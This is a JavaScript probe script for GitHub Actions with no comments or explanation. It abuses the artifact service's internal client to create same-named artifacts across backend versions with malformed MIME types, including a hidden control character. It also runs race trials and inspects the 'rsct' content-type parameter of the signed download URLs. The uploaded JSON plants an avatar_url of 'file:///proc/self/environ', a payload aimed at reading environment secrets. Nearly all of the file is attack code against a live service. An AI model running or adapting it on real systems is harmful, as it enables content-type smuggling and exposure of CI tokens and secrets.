import {createHash} from 'node:crypto';
import http from 'node:http';
import https from 'node:https';
import {BlobClient} from '@azure/storage-blob';
import {internalArtifactTwirpClient} from '../node_modules/@actions/artifact/lib/internal/shared/artifact-twirp-client.js';
import {getBackendIdsFromToken} from '../node_modules/@actions/artifact/lib/internal/shared/util.js';
import {StringValue} from '../node_modules/@actions/artifact/lib/generated/index.js';

const ids=getBackendIdsFromToken(); const client=internalArtifactTwirpClient({maxAttempts:1});
const repo=process.env.GITHUB_REPOSITORY, runId=process.env.GITHUB_RUN_ID, token=process.env.GITHUB_TOKEN;
const odd='\u0085application/json';
const body=Buffer.from(JSON.stringify({full_name:`${repo}/x`,owner:{login:'cassette',avatar_url:'file:///proc/self/environ'},description:'dupmime',stargazers_count:0}));
const body2=Buffer.from(JSON.stringify({full_name:`${repo}/y`,owner:{login:'cassette2',avatar_url:'file:///proc/self/environ'},description:'dupmime2',stargazers_count:1}));
const sha=b=>createHash('sha256').update(b).digest('hex');
function req(url,method='GET',body=null,headers={}){return new Promise((resolve,reject)=>{const t=new URL(url);const mod=t.protocol==='https:'?https:http;
  const r=mod.request(t,{method,headers,timeout:25000},res=>{const c=[];res.on('data',x=>c.push(x));res.on('end',()=>resolve({status:res.statusCode,headers:res.headers,body:Buffer.concat(c)}));});
  r.on('error',reject);r.on('timeout',()=>r.destroy(new Error('timeout')));if(body)r.write(body);r.end();});}
async function upload(url,bytes,ct){const b=new BlobClient(url).getBlockBlobClient();await b.uploadData(bytes,{blobHTTPHeaders:{blobContentType:ct}});}
async function create(name,version,mime,omit){try{return await client.CreateArtifact({...ids,name,version,...(omit?{}:{mimeType:StringValue.create({value:mime})})});}catch(e){return {ok:false,err:String(e.message).slice(0,160)}}}
async function fin(name,body){try{return await client.FinalizeArtifact({...ids,name,size:String(body.length),hash:StringValue.create({value:`sha256:${sha(body)}`})});}catch(e){return {ok:false,err:String(e.message).slice(0,160)}}}
async function signed(name){try{const r=await client.GetSignedArtifactURL({...ids,name});const u=new URL(r.signedUrl||r.signed_url||'');return {url:u.href,hasRsct:u.searchParams.has('rsct'),rsct:u.searchParams.get('rsct'),blob:u.pathname.split('/').pop()};}catch(e){return {err:String(e.message).slice(0,120)}}}
async function dl(id){const r1=await req(`https://api.github.com/repos/${repo}/actions/artifacts/${id}/zip`,'GET',null,{Authorization:`Bearer ${token}`,Accept:'application/vnd.github.v3+json','User-Agent':'dupmime'});const e={status:r1.status};if(r1.headers.location){const u=new URL(r1.headers.location);e.hasRsct=u.searchParams.has('rsct');e.rsct=u.searchParams.get('rsct');e.blob=u.pathname.split('/').pop();}return e;}
const cases=['v7-then-v6omit','v7-then-v6empty','v7-then-v6odd','v6omit-then-v7'];
for(const label of cases){
  const name=`dm-${runId}-${label}`; const rec={label};
  try{
    let c1,c2;
    if(label==='v7-then-v6omit'){ c1=await create(name,7,'application/json'); c2=await create(name,6,null,true); }
    else if(label==='v7-then-v6empty'){ c1=await create(name,7,'application/json'); c2=await create(name,6,'',false); }
    else if(label==='v7-then-v6odd'){ c1=await create(name,7,'application/json'); c2=await create(name,6,odd,false); }
    else { c1=await create(name,6,null,true); c2=await create(name,7,'application/json'); }
    rec.c1={ok:!!c1.ok,err:c1.err,ext:c1.signedUploadUrl?new URL(c1.signedUploadUrl).pathname.split('.').pop():null};
    rec.c2={ok:!!c2.ok,err:c2.err,ext:c2.signedUploadUrl?new URL(c2.signedUploadUrl).pathname.split('.').pop():null};
    if(c1.ok) await upload(c1.signedUploadUrl,body,odd);
    if(c2.ok && c2.signedUploadUrl!==c1.signedUploadUrl) await upload(c2.signedUploadUrl,body2,odd);
    const f=await fin(name,body); rec.fin={ok:!!f.ok,id:String(f.artifactId||''),err:f.err};
    if(f.ok){ rec.sig=await signed(name); rec.dl=await dl(String(f.artifactId)); }
  }catch(e){rec.err=String(e.message).slice(0,200);}
  console.log('DUPMIME',JSON.stringify(rec));
}
// race: v7-json and v6-odd concurrently, 10 trials, finalize after both, inspect rsct
for(let i=0;i<10;i++){
  const name=`dmr-${runId}-${i}`; const rec={i};
  try{
    const p1=create(name,7,'application/json'); const p2=create(name,6,odd);
    const [c1,c2]=await Promise.all([p1,p2]);
    rec.c1={ok:!!c1.ok,ext:c1.signedUploadUrl?new URL(c1.signedUploadUrl).pathname.split('.').pop():null};
    rec.c2={ok:!!c2.ok,ext:c2.signedUploadUrl?new URL(c2.signedUploadUrl).pathname.split('.').pop():null};
    if(c1.ok) await upload(c1.signedUploadUrl,body,odd);
    if(c2.ok && c2.signedUploadUrl!==c1.signedUploadUrl) await upload(c2.signedUploadUrl,body2,odd);
    const f=await fin(name,body); rec.fin=!!f.ok;
    if(f.ok){rec.dl=await dl(String(f.artifactId)); rec.sig=await signed(name);}
  }catch(e){rec.err=String(e.message).slice(0,150);}
  console.log('DUPRACE',JSON.stringify(rec));
}
